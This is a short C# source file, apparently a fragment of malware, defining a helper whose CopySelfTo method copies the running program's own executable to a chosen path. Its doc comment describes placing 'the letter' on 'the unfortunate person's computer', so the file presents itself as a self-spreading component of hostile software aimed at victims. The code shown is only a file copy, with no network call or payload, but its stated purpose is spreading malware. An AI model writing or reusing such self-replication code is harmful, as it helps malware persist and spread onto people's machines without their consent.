using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A helper class for copying the letter to any location to the unfortunate person's computer.
    /// </summary>
    public static class Copy
    {
        public static bool CopySelfTo(string target, bool overwrite = true)
        {
            try
            {
                File.Copy(Constants.MyPath, target, overwrite);
                return File.Exists(target);
            }
            catch
            {
                return false;
            }
        }
    }
}
